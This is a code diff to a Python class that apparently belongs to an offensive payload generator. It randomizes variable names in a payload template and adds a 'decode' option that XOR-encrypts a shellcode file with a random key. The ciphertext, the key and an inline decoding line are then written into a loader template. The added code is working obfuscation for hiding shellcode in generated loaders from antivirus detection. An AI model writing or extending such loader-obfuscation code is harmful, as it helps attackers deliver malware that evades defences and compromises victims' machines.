@@ -19,11 +19,24 @@ class RandomVar:
         for _ in range(19):
             Var =''.join(random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(LenStr))
             self.ListVar.append(Var)   
-        if self.args.load:    
-            with open (os.getcwd()+'/Package/Template/ShellCode.txt','rt') as ExploitRename:
+        if self.args.load  and not self.args.decode:    
+            with open (os.getcwd()+'/Package/Template/ShellCode.txt','rt') as ExploitRename:  
                 self.ExploitRename = ExploitRename.read().replace('ShellCode','_'+self.ListVar[15])
             with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as FulNameShell :
-                FulNameShellCode = FulNameShell.write(self.ExploitRename)      
+                FulNameShellCode = FulNameShell.write(self.ExploitRename) 
+        if  self.args.decode:        
+            def EncodeShell():  
+                import secrets        
+                with open (os.getcwd()+'/Package/Template/ShellCode.txt','rt') as DecodeTEXT:
+                    DecodeTEXTRead = DecodeTEXT.read().replace('ShellCode','    _'+self.ListVar[15],1).replace('ShellCode','_'+self.ListVar[15])
+                with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as DecodeTEXT:  
+                    DecodeTEXT = DecodeTEXT.write(DecodeTEXTRead)
+                with open (os.getcwd()+'/Package/Template/ShellCode.txt','rt') as DecodeTEXT:
+                    DecodeTEXTRead = bytes(DecodeTEXT.read().encode())  
+                self.ValueKeyShell =  secrets.token_bytes(len(DecodeTEXTRead)) 
+                self.ShellDeCode = bytes([ D  ^ L for D , L in zip(DecodeTEXTRead  ,self.ValueKeyShell) ])  
+                    
+            EncodeShell()                   
     def RandomName(self,**kwargs): 
 
         CopyShellHolder = shutil.copy(os.getcwd()+'/Package/Template/TempPayload.txt',os.getcwd()+'/Package/Template/TempPayloadLoader.txt')
@@ -62,16 +75,22 @@ class RandomVar:
                 line = line.replace('_14','_'+self.ListVar[13]) 
             elif '_15' in line :
                 line = line.replace('_15','_'+self.ListVar[14]) 
-            elif '_16' in line :
-                line = line.replace('_16','_'+self.ListVar[15]) 
+            if self.args.decode and '_1b' in line:
+                line = line.replace(
+                '_1b','Shell = '+str(self.ShellDeCode)+'\n'+'    Key2 = '+str(self.ValueKeyShell)+'\n'\
+                +'    _'+self.ListVar[15]+' = bytes([ Z ^ C for Z , C in zip(Shell, Key2)]).decode()\n',1)
+            else:    
+                line = line.replace('_1b','_'+self.ListVar[15]) 
             print(line,end=''),  
-        for line in fileinput.FileInput(FShellHplder,inplace=1):
+        for line in fileinput.FileInput(FShellHplder,inplace=1):          
             if '_16' in line :
-                line = line.replace('_16','_'+self.ListVar[15]) 
+                    line = line.replace('_16','_'+self.ListVar[15]) 
             elif '_17' in line :
                 line = line.replace('_17','_'+self.ListVar[16])
             elif '_18' in line :
-                line = line.replace('_18','_'+self.ListVar[17])        
+                line = line.replace('_18','_'+self.ListVar[17])    
+            elif self.args.decode:
+                line = line.replace('  =   b""','')
             print(line,end=''),
         for line in fileinput.FileInput(FShellHplder,inplace=1):
             if '_13' in line :
@@ -84,11 +103,12 @@ class RandomVar:
                 line = line.replace('_17','_'+self.ListVar[16])
             elif '_18' in line :
                 line = line.replace('_18','_'+self.ListVar[17])        
-            print(line,end=''),            
-        Pattern = '_'+self.ListVar[15].strip()+'  =   b""'    
-        with open( os.getcwd()+'/Package/Template/TempPayloadLoader.txt','rt') as CopyShell:
-            CopyShell = CopyShell.read().replace(Pattern,self.ExploitRename)
-        with open( os.getcwd()+'/Package/Template/TempPayloadLoader.txt','wt') as ReCopyShell:
-            ReCopyShell.write(CopyShell)
+            print(line,end=''),     
+        if self.args.load and not self.args.decode:           
+            Pattern = '_'+self.ListVar[15].strip()+'  =   b""'    
+            with open( os.getcwd()+'/Package/Template/TempPayloadLoader.txt','rt') as CopyShell:
+                CopyShell = CopyShell.read().replace(Pattern,self.ExploitRename)
+            with open( os.getcwd()+'/Package/Template/TempPayloadLoader.txt','wt') as ReCopyShell:
+                ReCopyShell.write(CopyShell)
 if __name__=='__main__':
     RandomVar()
